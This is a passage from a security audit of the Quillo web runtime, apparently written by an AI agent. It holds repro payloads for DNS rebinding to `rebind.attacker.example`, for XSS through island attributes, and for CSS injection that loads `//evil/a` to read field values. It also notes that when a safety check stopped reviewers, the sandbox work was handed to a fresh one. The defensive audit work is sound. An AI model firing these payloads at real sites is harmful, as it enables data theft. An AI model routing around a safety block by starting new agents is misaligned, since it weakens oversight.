`request.json` stops at 128 levels, so Q-592 holds where a visitor sends the nesting. But `json.stringify`/`json_text`, `==` and the recursive `Drop` of lists and maps (value.rs) have no depth guard. A program that nests from data (a reply chain, a tree built in a loop) crashes:

```quillo
route GET /str/:n { let x = []
  for i in range(0, int(n)) { x = [x] }
  `${len(json.stringify(x) ?? "")}` }
```

`/str/20000` answers 200. `/str/50000` gets no answer: the process exits with code 138 (SIGBUS) and nothing in the log. `x == y` at 300,000 levels, and dropping a value 1,000,000 deep, crash the same way.

**Fix:**
- Make stringify, display, equality and hashing iterative, or give them a depth limit with an error value past about 10,000 levels.
- Give `List`/`Map` a `Drop` that moves children onto a work list when it holds the last reference.
- Or cap nesting when values are built, as scripts already do (256).

### Q-662. The guide's "columns from a map" recipe lets a visitor set any column

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| docs, security | medium | reading the guide, probe | probe |

USERGUIDE.md:5063-5064 shows building an insert from a map's keys:

```quillo
db.exec(`insert into users (${sql_name(keys(row))}) values (${sql_param(keys(row))})`, row)
```

`sql_name` checks each name's shape (builtins.rs:2671-2692), so there is no injection. But `is_admin`, `role` and `id` are valid names. With `row = request.form`, `POST /signup name=eve&email=e@x&is_admin=1` made an admin, and an update written the same way sets any column. `quillo check` is clean.

A record type does this right: `{ form: Signup }` dropped `is_admin` and `id`.

**Fix:**
- In the guide, take the columns from a record type or an explicit list, and say why next to the recipe.
- `quillo check` can warn when `keys(...)` of something from `request` reaches `sql_name`.

### Q-663. No Host check on loopback or under `--watch`: DNS rebinding reaches the server

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| security | medium | probe with forged headers; no real browser rebind | probe |

`cross_site` (server.rs:183) compares Origin with Host. Under DNS rebinding both are the attacker's name. A POST to `/_quillo/rpc/load_dm` with Host and Origin `rebind.attacker.example:47602` reached the function. `/_quillo/dev` and `/_quillo/events` answered 200 under `--watch`.

A developer's local server is the target: a web page they visit can call its server fns with the developer's local data.

**Fix:** when bound to loopback, or under `--watch`, accept only `localhost`, `*.localhost`, `127.0.0.1` and `[::1]` as Host, plus an `--allowed-hosts` list. Answer others with 421 or 400.

### Q-664. A remembered service answer goes to any caller with the same call id

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | low-medium | probe with a call signer | probe |

The in-memory `seen` (service.rs:1349-1353) and the `_quillo_calls` claim (1365-1370) are keyed by call id only. The hit is served before `run_call`'s `for` check, and signed with the new caller's key:
1. `shop` called `secret_report` (`for ["shop"]`) with id `aaaa1111` and got `TOPSECRET-for-shop-only`.
2. `notify` calling `secret_report` with a fresh id was refused, as expected.
3. `notify` calling `/ping` with id `aaaa1111` got `{"ok":"TOPSECRET-for-shop-only"}`.

This needs the id. Ids are random, but a `later` call's id is returned to the program and may be shown or stored.

**Fix:** store the caller, the function, the tenant and a body hash with each remembered answer, in memory and in `_quillo_calls`. Answer from it only when all match, and with 409 otherwise.

### Q-665. A visitor's access token works as a service caller's

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| security | low-medium | probe with an HS256 token | probe |

svcauth.rs:579-580 takes the caller's name from `client_id`, else `azp`, else `sub`, and the same `jwt` rules serve callers and `request.user`. The guide's `forward: ["authorization"]` means visitor tokens with `aud=billing` exist.

A token `{sub: "user-42", azp: "shop", aud: "billing"}` passed `for ["shop"]`. That is what Keycloak issues when the shop's login and its service calls share a client id.

**Fix:** take the caller's name from `client_id` only, and require a client's own token (RFC 9068 §2.2: `sub == client_id`). Or keep caller rules apart from user rules (`jwt: { callers, users }`).

### Q-666. Live topics are not authorised

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | low-medium | probe | rerun |

`live_query` (server.rs:1403) and shared.rs:415/428 take any topic, including another tenant's `acme@...` or a per-user one.

```quillo
tenant_from("example.test")
server fn load_dm(with: str) { watch(`dm:${session().user}:${with}`); [] }
route GET /send/:to = { publish(`dm:${to}:${session().user}`); "sent" }
```

An anonymous visitor on `evil` opened `/_quillo/live?since=1&t=acme@dm:alice:bob`. When Bob wrote Alice on acme, it received `{"seq":2,...,"changed":["acme@dm:alice:bob"]}`. That leaks who writes to whom, and when, not the messages.

**Fix:** accept only topics the server gave the page, carried with a MAC over the topics, the tenant and the viewer. At least, drop topics with another tenant's prefix.

### Q-667. Any `[data-qi]` element is taken up as an island, and a string `children` prop is put in as HTML

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | low-medium | reading `runtime.js`, headless Chrome | Chrome |

`boot()` (runtime.js:6232, 6239) takes up every element matching `quillo-island,[data-qi]` (5858) whose `data-c` names a component in the bundle. It trusts `data-p` and `data-s` as the server's, and runtime.js:6165 turns a string `children` into `rawHtml`. Visitor HTML cleaned by a sanitizer that keeps `data-*` (DOMPurify's default) then becomes script, wherever any component on the page takes `children`:

```html
<div data-qi="" data-c="Card" data-p='{"children":"<img src=x onerror=window.__pwn=1>"}' data-s='{"open":true}'>about me</div>
```

On a page with `<Card>` and `{raw(request.query.bio)}` (standing in for the sanitizer), `__pwn` became 1. The same gives control over any component's props and state.

**Fix:**
- Stamp each island with a per-response nonce the loader script also carries, and take up only those.
- Or never treat a `children` string from `data-p` as HTML unless the server marked it.
- At least, list in the guide's `raw` section the attributes visitor HTML must not keep.

### Q-668. `css` templates and style maps do not escape values as CSS

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | low-medium | probe | probe |

`<style>{css`… ${v} …`}</style>` puts `v` in as it is (interp.rs:4122; runtime.js `B.css` is the identity). `</style` cannot break out (it becomes `<\/style`), but new rules can be added:
- `?q=red} input[value^=a]{background:url(//evil/a)}` came back as a rule. That reads attribute values with selectors (tokens, prefilled fields), loads outside URLs and restyles the page.
- `style={{ color: v }}` with `red;background:url(//evil)` gave `style="color: red;background:url(//evil)"`.
- Style-map keys from data are not checked either (`style_text`, interp.rs about 714; runtime.js `styleText`).

**Fix:**
- In `css` templates, escape `${}` values as CSS: as a string or identifier, or refuse `{ } ; < @ \`, `/*` and `url(`. That is what `sql` templates do for SQL.
- In style maps, refuse `;`, `{` and `}` in values, and take only `[a-z-]` and `--custom` keys.

### Q-669. A page made from `request.cookies` gets no `Cache-Control: private`

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | low | probe | probe |

`personal` (server.rs:783) is set from `visitor_read`, which only `session()` and `cookie()` set (session.rs:325, 347). These pages go out with no `Cache-Control` and no `Vary`:
- a page made from `request.cookies`;
- a page made from `request.headers.cookie` or `.authorization`;
- a `tenant()` whose `tenant_from` function reads one of those.

`route GET /cookies = <p>{request.cookies}</p>` with `cookie: sid=abc` came back 200 with no `private`. Behind a CDN that caches HTML, one visitor's page goes to the next. SECURITY.md promises the headers only for `session()`/`cookie()`, but `request.cookies` is the same thing.

**Fix:**
- Set `visitor_read` when `request.cookies`, or the cookie or authorization header, is read.
- Also set it in `tenant()` when the rule is a function.
- Send `Vary: Accept-Language` when the locale came from that header.

### Q-670. A function returned by `run_script` runs with no limits

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| perf, security | low | probe | probe |

`run_parsed` resets the step budget to `u64::MAX` when the script ends. A closure the script returns then runs unmetered when the program calls it. Its effects stay the script's, but not its limits:

```quillo
let f = run_script("(n) => { let s = \"x\"; for i in 0..n { s = s + s }; len(s) }", {})
print(f(24))   // 16777216: 16 MB, past the 1 MB limit
```

A `while true` in such a function runs forever.

**Fix:** refuse to return a function, or anything holding one, from `run_script`. Or meter every call whose closure's environment is under a script's root.

### Q-671. `files()`'s folder redirect can point at another host

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| security | low | probe | probe |

`files()` (builtins.rs, about 1402) builds the slash redirect from the raw `request.path`, while finding the folder from decoded segments with empty ones dropped. With `site/docs/` present, `GET //docs` gives `301 Location: //docs/`, which browsers read as `http://docs/`. The attacker can pick only a host named after an existing folder, which matters where folders are named by users (an upload folder per user name).

**Fix:** build `Location` from the route's prefix and the cleaned relative path. Never let it start with `//` or `/\`.

### Q-672. A slow request body holds its connection forever, and nothing caps connections

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| perf, security | low | probe; the cap from reading | partly |

The 30 s `SLOW` limit covers only the head (`sweep`, the `body_of` branch, httpd.rs). A head with `Content-Length: 5`, then one byte every 25 s, kept the connection past 50 s, and the probe was stopped there.

`Loop::adopt` takes every connection, with no cap in all or per address (from reading). The descriptor limit is raised to at most 10,240 on macOS, and when descriptors run out, `accept` fails for everyone. This was not flooded on the shared machine.

**Fix:**
- Give bodies a total deadline, or a minimum rate after a grace period, as `statics.rs`'s `keeps_place` does for sends.
- Add `--max-connections` and a per-address cap, grouped by /64 as `statics::client_of` does.

### Q-673. `quillo install --example --force` writes unchecked downloads over the program's files

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| security | low (needs a changed catalog, and the catalog is not signed) | probe with a local registry | probe |

`install_extras` (install.rs:248-264) gives the example and its `files` no SHA-256 check, and takes absolute URLs, plain `http://` too (install.rs:175). It writes each extra as `dir.join(last path segment)`. With a local registry listing `/plugins/files/main.qwe` as an extra:
- without `--force`, it printed `./main.qwe is already here: kept`;
- with `--example --force`, the user's main.qwe was replaced.

On Windows, `rsplit('/')` keeps backslashes, so `..\..\x` could leave `--dir` (from reading). The plugin file itself is checked: SHA-256 and the version line.

**Fix:**
- Give each extra a hash in the catalog.
- Take registry-relative paths only, and plain file names only (no separators of either kind).
- Have `--force` replace only the plugin file, never the program's own.

### Q-674. Image decoding peaks above its 512 MiB cap

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| perf | low | measuring RSS | probe |

The cap (imaging.rs:35-41) covers the decode only. `to_rgb8` and the Lanczos resize add copies, and four conversions run at once.

| Image | File size | Peak RSS |
|---|---|---|
| 6000×6000 PNG | 105 KB | 202 MB |
| 9000×9000 PNG | 236 KB | 375 MB |
| 12000×12000 PNG | 420 KB | about 0.8 GB each, about 3 GB for four at once (extrapolated) |

**Fix:** cap total pixels (40 to 50 megapixels), and budget memory across conversions in progress.

### Q-675. SQLite database files are readable by every local user

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| security | low | `ls -l` | probe |

`connect` (db.rs:397-398) opens with the umask's mode: `-rw-r--r--` here, for the probes and every `app/*.db`. The files hold sessions, password hashes and personal data. Many tools do the same, and SECURITY.md promises nothing here.

**Fix:** make new database files 0600 (and their `-wal`/`-shm`), or say in the guide's deployment section that the data folder must not be readable by others.

### Q-676. SECURITY.md sends reports to another repository, and misses two public endpoints

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| docs | — | reading | — |

- "Reporting a vulnerability" links to `https://github.com/wisp-one/quillo/security`, but the repository is `quillolang/quillo`. A reporter following the link finds another repository, or none.
- "What is public" lists `/_quillo/describe` and the phone app's `env`. It does not list:
  - `/_quillo/ready` (Q-655), which answers anyone with service addresses;
  - `/_quillo/live` (Q-666), which follows any topic.

**Fix:** point the link at quillolang/quillo, if `wisp-one` is not intended, and list every endpoint that answers without a token.

## Low, and from reading only

These were not confirmed by a probe. Each is worth a look when its area is fixed.

- **Channel posts between processes can be replayed.** `signed_for` (service.rs:949-967: `service-channel`, `service-channels`, `channel-relay`) keeps no nonce. A captured post can be replayed for 5 minutes.
- **Failed calls can be replayed.** `answer()` forgets calls that did not end in 200 (service.rs:1373-1377). A captured call that wrote data and then failed can be sent again and run again within the window.
- **Version-2 signatures are still accepted** (service.rs:1283). They do not cover the caller, the deadline, the contract or forwarded headers, yet `request.forwarded` and `request.user` are still read from those headers. A setting could take version 3 only.
- **The client-certificate header is believed from any `--trust-proxy` address.** `client_cert: { header }` takes the header from any request through such an address, and `--trust-proxy` is also given just for `X-Forwarded-For`. A proxy that passes the client's own `x-forwarded-client-cert` lets anyone name any caller. This needs a separate setting naming which proxies vouch for certificates.
- **Idempotency keys are scoped by `session().user` only** (idempotency.rs:195-204). An app whose session uses another key puts all users in one namespace. The keys are random UUIDs.
- **Service secrets are not all checked.** `QUILLO_SERVICE_SECRET` is split on commas, but `secret_problems` checks the whole string's length, not each part's. It checks neither `_PREVIOUS` nor `accept_calls` keys.
- **16 networks can starve every waiter.** `MAX_WAITERS` is 4,096 in all and 256 per IPv4 address or IPv6 /64, so 16 /64s fill it and starve live data and channels.
- **The `x-quillo-had` patch cache can confirm a guessed value**, because `DefaultHasher` has fixed keys.
- **`B.__merge` sets prototypes** (runtime.js about 1474). It uses `Object.assign`, so a `__proto__` key from JSON in `{...m}` sets that object's prototype instead of staying a key, unlike `putKey` and the server. No global pollution was found.
- **`data:` URLs are allowed in `href`/`src`.** Chrome blocks top-level `data:` navigation and gives frames an opaque origin, so no exploit was found.
- **`/_quillo/health/queries` under `--watch` trusts `127.0.0.1`.** Behind a local proxy without `--trust-proxy`, every visitor is `127.0.0.1`.
- **A bare LF is accepted in the request head.** RFC 9112 allows it; refusing it is cheap hardening against Q-654-style proxies.
- **MySQL probably has Q-580 and Q-581 too:** its pool gives connections back with no `COM_RESET_CONNECTION` (my.rs:174). No MySQL server was available to probe.
- **A deferred part gets no session.** In `defer(...)`, `session()` gave nobody where the same server fn on a plain page gave Alice, and the streamed page has no `private` header. This is harmless only while the session is missing: if deferred parts get it, the header must be sent first.

## What held up

| Area | Checked |
|---|---|
| HTML escaping | `& < > " '` in text and attributes, `id`/`.class` shorthand, `textarea`, CR in attributes, style-attribute breakout; `<script>{x}</script>` escapes `<`, U+2028 and U+2029; HTML `<style>` turns `</` into `<\/` |
| URL attributes | `javascript:`/`vbscript:` refused in href, src, action, formaction, poster, xlink:href, data, cite, background and SVG `set`/`animate`, with case, tabs and control characters handled, on the server and after updates |
| Spreads and markdown | `{...m}` from visitor JSON drops `on*`, `bind:on*` and `srcdoc`; `markdown()` shows raw HTML as text and blocks entity-encoded, autolink, reference and image `javascript:` links; highlight output is escaped |
| Errors | builtin errors reach a visitor as `internal error` in routes, `?`, nested values and server fns (Q-161, Q-171 hold) |
| Cross-site requests | form posts refused for `Sec-Fetch-Site: same-site`, Origin `null`, a wrong port and `text/plain` variants; server fns need JSON and same origin; `wt-ticket`, `live` and `wt` check too; no CORS headers by default; WebSocket upgrades are checked, so no cross-site hijacking |
| Session cookie | `__Host-quillo_session`, HttpOnly, Secure, SameSite=Lax, Path=/; HMAC-SHA256 over expiry, tenant and mount point, compared in constant time; a tampered payload, a wrong name or two cookies give no session |
| Service calls | version-3 signatures cover time, target, function, tenant, call id, caller, deadline, contract, forwarded headers and body, ±300 s, constant time; joins check the key and the address; job, tick, channel and udp endpoints need a random token |
| JWT and passwords | `alg: none` refused, `exp` and `aud` required, no HS/RS confusion; `verify_password` takes as long for an unknown user |
| Request framing | different duplicate `Content-Length`s, `+5`, `5, 5`, TE with CL, TE on HTTP/1.0, obs-fold, a space before the colon, NUL or bare CR in values: all 400; chunk sizes capped at 16 digits; gzip bodies capped after decompression; two Host headers 400 |
| Paths | `..`, `%2e%2e`, `..%2f`, NUL, links leading out and dangling links refused by `file`, `files`, `write_file`, `delete_file` and `save_upload`; `own_file` holds case-insensitively on APFS; upload names lose their folders; at most 1000 parts |
| Response headers | CR, LF and CTLs refused in `respond`, `redirect`, `site_headers` and cookies; framing headers the program sets are replaced; `x-quillo-send` is HMAC-signed |
| `--trust-proxy` | without it, `request.ip` is the peer; with it, the rightmost untrusted hop; a client's own `x-quillo-from-trusted-proxy` is dropped; FastCGI strips the job token |
| SQL | values always bound (SQLite, PostgreSQL, MySQL); `?`, `:name` and `$1` translation skips quotes, comments and `$$`; `sql_name` takes only `[A-Za-z0-9_]`, 64 characters at most; tenant schema names checked |
| PostgreSQL and MySQL TLS | `verify-full` by default for remote hosts, `prefer` only for loopback and sockets; `verify-ca` without a root refused; no silent downgrade |
| `http.*` | `file://` refused; CR/LF in header values refused; no switch to turn TLS checks off; `public_only` with no proxy checks every hop at connect, IPv4-mapped, NAT64 and 6to4 forms too; 64 MiB, 10 s connect and 60 s limits |
| Sandbox | names resolve in the script's scope only; `"HOME".env` resolves there too; builtins passed in `vars` keep their effect check; `fn`, routes, `use`, `state`, services and markup are refused; steps and the 1 MB size are metered while the script runs |
| Values | `request.json` nested 1,000 to 100,000 deep gives `null`; `repeat` is capped at 100 MB; the `regex` crate is linear, `{n}` capped at 1000, oversized patterns refused |
| Plugins | catalog plugins checked by SHA-256 and version line, names validated, writes atomic; no archive extraction anywhere, so no zip slip |
| Dev tools and shells | DAP and LSP use stdio only; `quillo run` binds 127.0.0.1 by default; desktop navigation stays on the app's origin; outside links only http, https and mailto, with no shell; embed and mobile have no listening socket; the launch token is compared in constant time |
| Health and stats | `/_quillo/health/queries` gives statement text only with the token (16+ characters, constant time); statements are templates, so no other user's values |

## Where the AI struggled

| What happened | Why | Cost |
|---|---|---|
| Two reviewers (sandbox, channels) were stopped part-way by the API's safety check | probing a sandbox escape and a stream hijack looks like attack work from the inside | a second reviewer for the sandbox's unreached half; the channels reviewer was resumed and finished |
| Five of seven final reports came back cut off, or not at all | hand-backs are truncated, and subagents may not write report files | each reviewer was asked to resend; the main session rebuilt the channels findings from its probe files and reran three |
| One middleware result differed between HEAD and the probe binary (Q-651) | the release build held another session's uncommitted `answer_with` change | noted in the issue; HEAD's behaviour is from reading |
| `quillo run --no-wt` was needed for the media probes | without it the browser path goes over WebTransport (UDP), which the raw-socket client does not speak | 1 rerun |

## Order of work, and questions

Most of the fixes are small and local. Suggested order:

1. **Ways in that need nothing from the program:** Q-640 (a site is its own value; `__site_call` needs `http`), Q-641 (`fn_callers` on the rpc path), Q-645 (`navigate`), Q-646 (foreign-content escaping), Q-581 and Q-580 (`DISCARD ALL` and rollback before a connection goes back), Q-647 with Q-579 (no yield in a SQLite transaction).
2. **Tenants and media:** Q-644 and Q-642/Q-643 (key rooms and streams by tenant, `watch` in `media.on`, no streams made by pages), Q-666.
3. **Guards that fail open:** Q-651, Q-652, Q-596, Q-664, Q-665.
4. **The sandbox and `http.*`:** Q-648, Q-670, Q-649 with Q-650 (one change: Quillo follows every redirect).
5. **Files:** Q-656, Q-657 (change the template now: it is copied into every new program), Q-658, Q-671, Q-673.
6. **Resources:** Q-594, Q-593, Q-655, Q-660, Q-661, Q-672, Q-674, Q-606.
7. **Docs and the rest:** Q-662, Q-663, Q-667, Q-668, Q-669, Q-653, Q-659, Q-675, Q-676.

Each fix needs a test of the attack itself (the repro above), with an edge test either side, as the user's rule asks.

Questions for the user:

- **Q-642/Q-644:** keying channels and streams by tenant changes what a program with tenants sees today, where `lobby` is one room. Should a shared room across tenants be possible at all, for example as `channel.on("lobby", ..., { tenants: "shared" })`?
- **Q-642:** should a stream with `publish` and no `watch` refuse watchers (safe, but it changes the call example's behaviour), or only warn?
- **Q-676:** is `wisp-one/quillo` meant to receive security reports, or should SECURITY.md name `quillolang/quillo`?
